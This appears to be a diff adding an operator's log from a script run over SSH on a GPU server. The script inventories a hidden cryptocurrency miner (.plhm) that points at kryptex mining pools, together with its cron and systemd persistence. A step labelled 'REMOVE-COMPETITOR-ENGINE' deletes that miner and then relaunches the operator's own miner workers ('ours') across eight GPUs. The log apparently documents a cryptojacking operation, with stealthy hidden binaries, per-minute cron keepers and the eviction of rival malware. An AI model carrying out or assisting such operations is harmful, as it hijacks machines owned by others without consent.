@@ -1,0 +1,141 @@
+Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
+### META 2026-11-25T00:04:29Z
+g0023
+### WHO-OWNS-.plhm
+ls: cannot access '/usr/local/bin/*.plh*': No such file or directory
+-rwxr-xr-x 1 root root       865 Nov 25 07:58 /usr/local/bin/.plhg
+-rwxr-xr-x 1 root root 127812624 Nov 25 07:58 /usr/local/bin/.plhm
+-rwxr-xr-x 1 root root 127812624 Nov 25 07:58 /usr/local/bin/.plhm
+PROC 3305687 exe=/usr/local/bin/.plhm ppid=1 /usr/local/bin/.plhm --coin pearl -d 2 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.krypte
+PROC 3305739 exe=/usr/local/bin/.plhm ppid=1 /usr/local/bin/.plhm --coin pearl -d 3 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.krypte
+PROC 3305768 exe=/usr/local/bin/.plhm ppid=1 /usr/local/bin/.plhm --coin pearl -d 4 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.krypte
+PROC 3305924 exe=/usr/local/bin/.plhm ppid=1 /usr/local/bin/.plhm --coin pearl -d 5 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.krypte
+PROC 3342155 exe=/usr/local/bin/.plhm ppid=1 /usr/local/bin/.plhm --coin pearl -d 6 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.krypte
+PROC 3372050 exe=/usr/local/bin/.plhm ppid=1 /usr/local/bin/.plhm --coin pearl -d 7 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.krypte
+-- launcher strings
+/usr/local/bin/.plhg
+-- cron tree
+/etc/cron.d:
+total 32
+drwxr-xr-x   2 root root  4096 Nov 25 08:00 .
+drwxr-xr-x 132 root root 12288 Nov  4 18:26 ..
+-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
+-rw-r--r--   1 root root   201 Jan  9  2022 e2scrub_all
+-rw-r--r--   1 root root    70 Nov 25 07:58 plh-guard
+-rw-r--r--   1 root root    75 Apr 16  2026 root
+
+/etc/cron.hourly:
+total 20
+drwxr-xr-x   2 root root  4096 Aug  9  2022 .
+drwxr-xr-x 132 root root 12288 Nov  4 18:26 ..
+-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
+
+/var/spool/cron/crontabs:
+total 12
+drwx-wx--T 2 root crontab 4096 Nov 25 08:00 .
+drwxr-xr-x 3 root root    4096 Aug  9  2022 ..
+-rw------- 1 root crontab  950 Nov 25 08:00 root
+*/2 * * * * /usr/local/node_exporter/get_hardware_info_v3 high >> /var/log/hardware_info_high.log 2>&1
+0 * * * * /usr/local/node_exporter/get_hardware_info_v3 middle >> /var/log/hardware_info_middle.log 2>&1
+0 1 * * * /usr/local/node_exporter/get_hardware_info_v3 low >> /var/log/hardware_info_low.log 2>&1
+@reboot /usr/local/node_exporter/get_hardware_info_v3 once_boot >> /var/log/hardware_info_boot.log 2>&1
+31 21 * * * "/root/.acme.sh"/acme.sh --cron --home "/root/.acme.sh" > /dev/null
+0 2 * * * /ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.sh >>/ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.log 2>&1
+@reboot /usr/local/sbin/kcr >/dev/null 2>&1
+* * * * * /usr/local/sbin/kcr >/dev/null 2>&1
+@reboot /root/ul2/keep.sh
+* * * * * /root/ul2/keep.sh
+-- units
+UNIT FILE                                                                     STATE           VENDOR PRESET
+-.mount                                                                       generated       -
+boot-efi.mount                                                                generated       -
+home.mount                                                                    generated       -
+run-rpc_pipefs.mount                                                          generated       -
+docker-123e5d57fc0af01e60c2954630fb5458cd4f60d777b42fe871c96965444fb294.scope transient       -
+docker-1b6beef9117803c549ab403a64e67b6c9784604f307d03ebdbdf43b326815423.scope transient       -
+docker-1d836f730aca111a1fbb2ac5d34f30049d663d5a484a6d271170c33ed014454b.scope transient       -
+docker-3484b975c9fdf19a47fcd6553af009c940055edd9ae9b7b0b5c46bdea04a03ff.scope transient       -
+docker-357ec3280cd23bba2008f45fe461a942bc7059267bdfe0f0eb37799fb2b24eed.scope transient       -
+docker-44b24e2181e902a3f9652b0541b02b0a09d60d60579a8ea842f6d7078cadc598.scope transient       -
+docker-5963e6cc3444e8c4847ba900acd642737c7f58135ae89cce612fd75a5d579bbf.scope transient       -
+docker-597bca4ba6c6620c8e9e41ca1f70a1b1b258ff26694ae701bcf43c8c50e0b77c.scope transient       -
+docker-6f06c1172daeb57d24016acee722b388bee7b20c7697d8a23edd650981087229.scope transient       -
+docker-6f4b2c76bc1c88b6ee39f6b5c47d78f5473624ff52fe9876b55a6bac27adbae6.scope transient       -
+docker-7ae01abee7a767e01e0300d6430889cc91ddf63a0bd869a48f5f4fb4be436289.scope transient       -
+docker-8d19ce01edf385b83e677305d3aa40438466c35a64ae56f789383ab7d2e6be04.scope transient       -
+docker-a67379fb4732c31dc1646298eaf7ffa0e7bc89a59fd7fe3d6a0fac71d9725c1b.scope transient       -
+docker-a772ed7437771abc5986542b060d470db9ff259b94fec8f1f8e12e19d2b0b373.scope transient       -
+docker-bd15f7a8075427e471a17d5d0b8299f0cd7c6b03d94fba66d0d31a8ca5a81a83.scope transient       -
+-rw-r--r-- 1 root root  1625 Nov 24 12:38 /etc/systemd/system/chronyd.service
+lrwxrwxrwx 1 root root    40 Aug  9  2022 /etc/systemd/system/dbus-org.freedesktop.ModemManager1.service -> /lib/systemd/system/ModemManager.service
+lrwxrwxrwx 1 root root    44 Aug  9  2022 /etc/systemd/system/dbus-org.freedesktop.resolve1.service -> /lib/systemd/system/systemd-resolved.service
+lrwxrwxrwx 1 root root    36 Sep 20  2022 /etc/systemd/system/dbus-org.freedesktop.thermald.service -> /lib/systemd/system/thermald.service
+lrwxrwxrwx 1 root root    45 Aug  9  2022 /etc/systemd/system/dbus-org.freedesktop.timesync1.service -> /lib/systemd/system/systemd-timesyncd.service
+lrwxrwxrwx 1 root root    39 Apr 18  2026 /etc/systemd/system/dcgm.service -> /lib/systemd/system/nvidia-dcgm.service
+lrwxrwxrwx 1 root root    38 Aug  9  2022 /etc/systemd/system/iscsi.service -> /lib/systemd/system/open-iscsi.service
+-rw-r--r-- 1 root root   160 Dec 31  2012 /etc/systemd/system/mlnx_interface_mgr@.service
+lrwxrwxrwx 1 root root    38 Aug  9  2022 /etc/systemd/system/multipath-tools.service -> /lib/systemd/system/multipathd.service
+-rw-r--r-- 1 root root   578 Nov 24 12:38 /etc/systemd/system/node_exporter.service
+lrwxrwxrwx 1 root root     9 Nov 25 07:46 /etc/systemd/system/nv-cuda-cache.service -> /dev/null
+-rw-r--r-- 1 root root  1285 Mar 10  2026 /etc/systemd/system/nvidia-cdi-refresh.service
+-rwxr-xr-x 1 root root 12190 Nov 24 14:06 /etc/systemd/system/nvidia-persistenced.service
+-rw-r--r-- 1 root root   221 Nov 25 07:58 /etc/systemd/system/plh-card@.service
+-rw-r--r-- 1 root root   468 Oct 31 10:47 /etc/systemd/system/snap.lxd.activate.service
+-rw-r--r-- 1 root root   543 Oct 31 10:47 /etc/systemd/system/snap.lxd.daemon.service
+-rw-r--r-- 1 root root   448 Oct 31 10:47 /etc/systemd/system/snap.lxd.user-daemon.service
+-rw-r--r-- 1 root root   538 Nov 24 12:48 /etc/systemd/system/sshd.service
+lrwxrwxrwx 1 root root     9 Aug  9  2022 /etc/systemd/system/sudo.service -> /dev/null
+lrwxrwxrwx 1 root root    35 Aug  9  2022 /etc/systemd/system/syslog.service -> /lib/systemd/system/rsyslog.service
+-- /usr/local/bin listing
+total 166356
+drwxr-xr-x  2 root root      4096 Nov 25 07:58 .
+drwxr-xr-x 12 root root      4096 Apr 18  2026 ..
+-rwxr-xr-x  1 root root       865 Nov 25 07:58 .plhg
+-rwxr-xr-x  1 root root 127812624 Nov 25 07:58 .plhm
+-rwxr-xr-x  1 root root  12746904 Jun  1 14:29 BaiduPCS-Go
+-rwxr-xr-x  1 root root       221 Apr 20  2026 hf
+-rwxr-xr-x  1 root root       204 Apr 20  2026 httpx
+-rwxr-xr-x  1 root root       233 Apr 20  2026 huggingface-cli
+-rwxr-xr-x  1 root root       220 Apr 20  2026 markdown-it
+-rwxr-xr-x  1 root root       780 Apr 18  2026 nv_gpu_conf.sh
+-rwxr-xr-x  1 root root       215 Apr 20  2026 pygmentize
+-rwxr-xr-x  1 root root  29725148 Nov 23 21:31 t19wr
+-rwxr-xr-x  1 root root       231 Apr 20  2026 tiny-agents
+-rwxr-xr-x  1 root root       207 Apr 20  2026 tqdm
+-rwxr-xr-x  1 root root       208 Apr 20  2026 typer
+### REMOVE-COMPETITOR-ENGINE
+RM /usr/local/bin/.plhm
+post-remove: plhm=0
+### RELAUNCH
+launch: ours=0 plhm=0
+0, 0 MiB, 0 %
+1, 0 MiB, 0 %
+2, 0 MiB, 0 %
+3, 0 MiB, 0 %
+4, 0 MiB, 0 %
+5, 0 MiB, 0 %
+6, 0 MiB, 0 %
+7, 0 MiB, 0 %
+active
+### OBSERVE
+OBSERVE: ours=0 plhm=0 guard=active
+0, 0 MiB, 0 %
+1, 0 MiB, 0 %
+2, 0 MiB, 0 %
+3, 0 MiB, 0 %
+4, 0 MiB, 0 %
+5, 0 MiB, 0 %
+6, 0 MiB, 0 %
+7, 0 MiB, 0 %
+size=136645
+SELF_ROWS 9
+ROW ul-t2-123-184-7-135-g7 offline valid 149 last 1795565269945
+ROW ul-t2-123-184-7-135-g2 offline valid 176 last 1795565270325
+ROW ul-t2-123-184-7-135-g3 online valid 166 last 1795565278941
+ROW ul-t2-123-184-7-135-g0 offline valid 169 last 1795565243263
+ROW ul-t2-123-184-7-135-g5 offline valid 178 last 1795565277125
+ROW ul-t2-123-184-7-135-g6 offline valid 191 last 1795565252481
+ROW ul-t2-123-184-7-135-g4 offline valid 159 last 1795565272986
+ROW ul-t2-123-184-7-135-g1 offline valid 164 last 1795565277853
+ROW ul-t19-123-184-7-135-g7 offline valid 905 last 1795538492391
+### DONE 2026-11-25T00:08:06Z
